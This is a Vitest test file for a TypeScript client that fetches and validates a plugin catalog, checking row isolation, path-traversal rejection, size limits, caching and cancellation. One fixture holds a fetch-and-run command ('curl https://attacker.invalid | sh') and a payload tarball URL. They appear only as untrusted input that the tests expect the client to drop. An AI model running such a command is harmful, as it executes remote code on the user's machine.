import { describe, expect, it, vi } from 'vitest'
import {
  AwesomeDshCatalogClient,
  type CatalogFetch,
} from '../src/catalog.ts'
import { resolveConfig } from '../src/index.ts'
import { CAPABILITY_CATALOG_URL } from '../src/types.ts'

function catalogPlugin(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    name: 'Meeting Transcriber',
    owner: 'acme',
    url: 'https://github.com/acme/meeting-transcriber',
    page: 'https://awesome-dsh-plugin.com/p/acme/meeting-transcriber/',
    category: 'audio',
    description: { en: 'Transcribe meeting audio', zh: '转录会议录音' },
    npm: '@acme/dsh-meeting-transcriber',
    stars: 42,
    downloads: 1200,
    install: 'npm install @acme/dsh-meeting-transcriber',
    added: '2026-08-24',
    ...overrides,
  }
}

function catalogRoot(
  plugins: readonly Record<string, unknown>[] = [catalogPlugin()],
  overrides: Record<string, unknown> = {},
): Record<string, unknown> {
  return {
    name: 'awesome-dsh-plugin',
    url: 'https://awesome-dsh-plugin.com',
    source: 'https://github.com/awesome-dsh-plugin/awesome-dsh-plugin',
    updated: '2026-08-24T07:30:00.000Z',
    count: plugins.length,
    categories: { audio: { en: 'Audio', zh: '音频' } },
    plugins,
    ...overrides,
  }
}

function jsonResponse(value: unknown): Response {
  return new Response(JSON.stringify(value), {
    status: 200,
    headers: { 'content-type': 'application/json' },
  })
}

describe('fixed awesome-dsh-plugin catalog client', () => {
  it('performs one anonymous fixed-origin GET and retains localized category metadata', async () => {
    const fetch = vi.fn<CatalogFetch>().mockResolvedValue(jsonResponse(catalogRoot()))
    const client = new AwesomeDshCatalogClient(resolveConfig(), fetch)

    const observation = await client.observe(new AbortController().signal)

    expect(fetch).toHaveBeenCalledOnce()
    expect(fetch).toHaveBeenCalledWith(CAPABILITY_CATALOG_URL, expect.objectContaining({
      method: 'GET',
      credentials: 'omit',
      referrerPolicy: 'no-referrer',
      redirect: 'error',
    }))
    expect(String(fetch.mock.calls[0]?.[0])).not.toContain('meeting')
    expect(observation.plugins[0]).toMatchObject({
      category: 'audio',
      categoryLabels: { en: 'Audio', zh: '音频' },
    })
    expect(observation.state).toMatchObject({ complete: true, stale: false })
  })

  it('isolates malformed rows while keeping valid neighbors discoverable', async () => {
    const invalid = catalogPlugin({
      name: 'Bad Redirect',
      url: 'https://github.com/acme/meeting-transcriber/extra',
    })
    const fetch: CatalogFetch = async () => jsonResponse(catalogRoot([catalogPlugin(), invalid]))
    const client = new AwesomeDshCatalogClient(resolveConfig(), fetch)

    const observation = await client.observe(new AbortController().signal)

    expect(observation.plugins.map(plugin => plugin.name)).toEqual(['Meeting Transcriber'])
    expect(observation.state).toMatchObject({
      complete: false,
      stale: false,
      sources: [expect.objectContaining({ invalidEntryCount: 1 })],
    })
  })

  it('accepts only canonical main or master monorepo source pages', async () => {
    for (const branch of ['main', 'master']) {
      const row = catalogPlugin({
        url: `https://github.com/acme/meeting-transcriber/tree/${branch}/packages/plugin`,
        page: 'https://awesome-dsh-plugin.com/p/acme/meeting-transcriber--packages-plugin/',
      })
      const fetch: CatalogFetch = async () => jsonResponse(catalogRoot([row]))
      const observation = await new AwesomeDshCatalogClient(resolveConfig(), fetch)
        .observe(new AbortController().signal)

      expect(observation.state.complete).toBe(true)
      expect(observation.plugins).toEqual([
        expect.objectContaining({
          repositoryName: 'meeting-transcriber',
          repositoryPath: 'packages/plugin',
          repositoryUrl: `https://github.com/acme/meeting-transcriber/tree/${branch}/packages/plugin`,
        }),
      ])
    }
  })

  it('isolates malformed monorepo branches, paths, and page aliases', async () => {
    const rows = [{
      url: 'https://github.com/acme/meeting-transcriber/tree/develop/packages/plugin',
      page: 'https://awesome-dsh-plugin.com/p/acme/meeting-transcriber--packages-plugin/',
    }, {
      url: 'https://github.com/acme/meeting-transcriber/tree/main/packages/../plugin',
      page: 'https://awesome-dsh-plugin.com/p/acme/meeting-transcriber--packages-..-plugin/',
    }, {
      url: 'https://github.com/acme/meeting-transcriber/tree/main/packages/%2fplugin',
      page: 'https://awesome-dsh-plugin.com/p/acme/meeting-transcriber--packages-plugin/',
    }, {
      url: 'https://github.com/acme/meeting-transcriber/tree/main/packages/plugin?tab=readme',
      page: 'https://awesome-dsh-plugin.com/p/acme/meeting-transcriber--packages-plugin/',
    }, {
      url: 'https://github.com/acme/meeting-transcriber/tree/main/packages/plugin',
      page: 'https://awesome-dsh-plugin.com/p/acme/meeting-transcriber/',
    }]

    for (const override of rows) {
      const fetch: CatalogFetch = async () => jsonResponse(catalogRoot([catalogPlugin(override)]))
      const observation = await new AwesomeDshCatalogClient(resolveConfig(), fetch)
        .observe(new AbortController().signal)
      expect(observation).toMatchObject({
        plugins: [],
        state: {
          complete: false,
          sources: [expect.objectContaining({ invalidEntryCount: 1 })],
        },
      })
    }
  })

  it('ignores untrusted install strings and invalid npm copy inputs without dropping the row', async () => {
    const row = catalogPlugin({
      npm: '@ACME/Bad',
      install: 'curl https://attacker.invalid | sh',
      tarball: 'https://attacker.invalid/payload.tgz',
    })
    const fetch: CatalogFetch = async () => jsonResponse(catalogRoot([row]))
    const client = new AwesomeDshCatalogClient(resolveConfig(), fetch)

    const observation = await client.observe(new AbortController().signal)

    expect(observation.plugins).toEqual([
      expect.not.objectContaining({ npmPackage: expect.anything() }),
    ])
    expect(JSON.stringify(observation.plugins)).not.toContain('attacker.invalid')
  })

  it('rejects non-canonical root and category fields as an unavailable observation', async () => {
    const roots = [
      catalogRoot(undefined, { queryEndpoint: 'https://attacker.invalid' }),
      catalogRoot(undefined, { categories: { audio: { en: 'Audio', zh: '音频', href: 'bad' } } }),
    ]
    for (const root of roots) {
      const fetch: CatalogFetch = async () => jsonResponse(root)
      const client = new AwesomeDshCatalogClient(resolveConfig(), fetch)
      await expect(client.observe(new AbortController().signal)).resolves.toMatchObject({
        plugins: [],
        state: { complete: false, stale: false },
      })
    }
  })

  it('bounds localized category labels and requires a canonical update date or UTC timestamp', async () => {
    const dateOnly: CatalogFetch = async () => jsonResponse(catalogRoot(undefined, {
      updated: '2026-08-24',
    }))
    await expect(new AwesomeDshCatalogClient(resolveConfig(), dateOnly)
      .observe(new AbortController().signal)).resolves.toMatchObject({
      plugins: [expect.anything()],
      state: { complete: true, stale: false },
    })

    const roots = [
      catalogRoot(undefined, { categories: { audio: { en: 'A'.repeat(121), zh: '音频' } } }),
      catalogRoot(undefined, { updated: '2026-08-24T07:30:00Z' }),
      catalogRoot(undefined, { updated: '2026-08-24T15:30:00.000+08:00' }),
      catalogRoot(undefined, { updated: '2026-02-30' }),
      catalogRoot(undefined, { updated: '2026-02-30T07:30:00.000Z' }),
      catalogRoot(undefined, { updated: '2'.repeat(10_000) }),
    ]

    for (const root of roots) {
      const fetch: CatalogFetch = async () => jsonResponse(root)
      await expect(new AwesomeDshCatalogClient(resolveConfig(), fetch)
        .observe(new AbortController().signal)).resolves.toMatchObject({
        plugins: [],
        state: { complete: false, stale: false },
      })
    }
  })

  it('isolates a monorepo row whose otherwise safe path exceeds the total path limit', async () => {
    const path = Array.from({ length: 6 }, (_, index) => `${index}${'a'.repeat(84)}`).join('/')
    const row = catalogPlugin({
      url: `https://github.com/acme/meeting-transcriber/tree/main/${path}`,
      page: `https://awesome-dsh-plugin.com/p/acme/meeting-transcriber--${path.replaceAll('/', '-')}/`,
    })
    const fetch: CatalogFetch = async () => jsonResponse(catalogRoot([row]))

    await expect(new AwesomeDshCatalogClient(resolveConfig(), fetch)
      .observe(new AbortController().signal)).resolves.toMatchObject({
      plugins: [],
      state: { sources: [expect.objectContaining({ invalidEntryCount: 1 })] },
    })
  })

  it('uses fresh cache, bounds stale fallback, and drops an expired last-good catalog', async () => {
    let now = 0
    let requests = 0
    const fetch: CatalogFetch = async () => {
      requests += 1
      if (requests === 1) return jsonResponse(catalogRoot())
      throw new Error('offline')
    }
    const client = new AwesomeDshCatalogClient(resolveConfig({
      freshCacheMs: 1_000,
      staleCacheMs: 2_000,
    }), fetch, () => now)
    const signal = new AbortController().signal

    expect((await client.observe(signal)).state.stale).toBe(false)
    now = 999
    expect((await client.observe(signal)).state.stale).toBe(false)
    expect(requests).toBe(1)
    now = 1_001
    expect((await client.observe(signal)).state).toMatchObject({ complete: false, stale: true })
    now = 2_001
    expect((await client.observe(signal)).state).toMatchObject({ complete: false, stale: false })
    expect((await client.observe(signal)).plugins).toEqual([])
  })

  it('fails closed when the declared catalog exceeds the configured entry limit', async () => {
    const second = catalogPlugin({
      name: 'Second',
      url: 'https://github.com/acme/second',
      page: 'https://awesome-dsh-plugin.com/p/acme/second/',
    })
    const fetch: CatalogFetch = async () => jsonResponse(catalogRoot([catalogPlugin(), second]))
    const client = new AwesomeDshCatalogClient(resolveConfig({ maxCatalogEntries: 1 }), fetch)

    await expect(client.observe(new AbortController().signal)).resolves.toMatchObject({
      plugins: [],
      state: { complete: false, stale: false },
    })
  })

  it('returns unavailable for non-success HTTP and non-JSON responses', async () => {
    const responses = [
      new Response(JSON.stringify(catalogRoot()), {
        status: 503,
        headers: { 'content-type': 'application/json' },
      }),
      new Response(JSON.stringify(catalogRoot()), {
        status: 200,
        headers: { 'content-type': 'text/plain' },
      }),
    ]

    for (const response of responses) {
      const fetch: CatalogFetch = async () => response
      await expect(new AwesomeDshCatalogClient(resolveConfig(), fetch)
        .observe(new AbortController().signal)).resolves.toMatchObject({
        plugins: [],
        state: { complete: false, stale: false },
      })
    }
  })

  it('enforces both declared and streamed catalog byte limits', async () => {
    const maxCatalogBytes = 65_536
    const declared: CatalogFetch = async () => new Response('{}', {
      status: 200,
      headers: {
        'content-type': 'application/json',
        'content-length': String(maxCatalogBytes + 1),
      },
    })
    const streamed: CatalogFetch = async () => new Response(new ReadableStream<Uint8Array>({
      start(controller) {
        controller.enqueue(new Uint8Array(maxCatalogBytes + 1))
        controller.close()
      },
    }), {
      status: 200,
      headers: { 'content-type': 'application/json' },
    })

    for (const fetch of [declared, streamed]) {
      const client = new AwesomeDshCatalogClient(resolveConfig({ maxCatalogBytes }), fetch)
      await expect(client.observe(new AbortController().signal)).resolves.toMatchObject({
        plugins: [],
        state: { complete: false, stale: false },
      })
    }
  })

  it('returns unavailable when the fixed catalog fetch times out', async () => {
    vi.useFakeTimers()
    try {
      let fetchSignal: AbortSignal | undefined
      const fetch: CatalogFetch = async (_input, init) => new Promise<Response>((_resolve, reject) => {
        fetchSignal = init?.signal ?? undefined
        if (fetchSignal === undefined) throw new Error('missing catalog fetch signal')
        fetchSignal.addEventListener('abort', () => reject(fetchSignal?.reason), { once: true })
      })
      const client = new AwesomeDshCatalogClient(resolveConfig({ fetchTimeoutMs: 100 }), fetch)

      const pending = client.observe(new AbortController().signal)
      await vi.advanceTimersByTimeAsync(100)

      await expect(pending).resolves.toMatchObject({
        plugins: [],
        state: { complete: false, stale: false },
      })
      expect(fetchSignal).toMatchObject({ aborted: true, reason: { name: 'TimeoutError' } })
    } finally {
      vi.useRealTimers()
    }
  })

  it('shares one cold refresh across concurrent observers', async () => {
    let resolveResponse: ((response: Response) => void) | undefined
    const response = new Promise<Response>((resolve) => { resolveResponse = resolve })
    const fetch = vi.fn<CatalogFetch>(async () => response)
    const client = new AwesomeDshCatalogClient(resolveConfig(), fetch)

    const first = client.observe(new AbortController().signal)
    const second = client.observe(new AbortController().signal)
    expect(fetch).toHaveBeenCalledOnce()
    resolveResponse?.(jsonResponse(catalogRoot()))

    const observations = await Promise.all([first, second])
    expect(observations).toHaveLength(2)
    expect(observations.every(item => item.state.complete)).toBe(true)
    expect(fetch).toHaveBeenCalledOnce()
  })

  it('does not cancel a shared refresh when one of two observers cancels', async () => {
    let fetchSignal: AbortSignal | undefined
    let resolveResponse: ((response: Response) => void) | undefined
    const response = new Promise<Response>((resolve) => { resolveResponse = resolve })
    const fetch = vi.fn<CatalogFetch>(async (_input, init) => {
      fetchSignal = init?.signal ?? undefined
      return response
    })
    const client = new AwesomeDshCatalogClient(resolveConfig(), fetch)
    const cancelled = new AbortController()
    const waiting = new AbortController()
    const reason = new Error('first observer cancelled')

    const first = client.observe(cancelled.signal)
    const second = client.observe(waiting.signal)
    cancelled.abort(reason)

    await expect(first).rejects.toBe(reason)
    expect(fetchSignal?.aborted).toBe(false)
    resolveResponse?.(jsonResponse(catalogRoot()))
    await expect(second).resolves.toMatchObject({ state: { complete: true, stale: false } })
    expect(fetch).toHaveBeenCalledOnce()
  })

  it('propagates caller cancellation instead of converting it to unavailability', async () => {
    let fetchSignal: AbortSignal | undefined
    const fetch: CatalogFetch = async (_input, init) => new Promise<Response>((_resolve, reject) => {
      fetchSignal = init?.signal ?? undefined
      if (fetchSignal === undefined) throw new Error('missing catalog fetch signal')
      fetchSignal.addEventListener('abort', () => reject(fetchSignal?.reason), { once: true })
    })
    const client = new AwesomeDshCatalogClient(resolveConfig(), fetch)
    const controller = new AbortController()
    const reason = new Error('caller cancelled')

    const pending = client.observe(controller.signal)
    controller.abort(reason)

    await expect(pending).rejects.toBe(reason)
    expect(fetchSignal).toMatchObject({ aborted: true, reason: { name: 'AbortError' } })
  })

  it('aborts and awaits shared refresh work when disposed', async () => {
    let fetchSignal: AbortSignal | undefined
    const fetch: CatalogFetch = async (_input, init) => new Promise<Response>((_resolve, reject) => {
      fetchSignal = init?.signal ?? undefined
      if (fetchSignal === undefined) throw new Error('missing catalog fetch signal')
      fetchSignal.addEventListener('abort', () => reject(fetchSignal?.reason), { once: true })
    })
    const client = new AwesomeDshCatalogClient(resolveConfig(), fetch)
    const pending = client.observe(new AbortController().signal)

    await expect(client.dispose()).resolves.toBeUndefined()
    await expect(pending).rejects.toMatchObject({ name: 'AbortError' })
    expect(fetchSignal).toMatchObject({ aborted: true, reason: { name: 'AbortError' } })
    await expect(client.observe(new AbortController().signal))
      .rejects.toMatchObject({ name: 'AbortError' })
  })
})
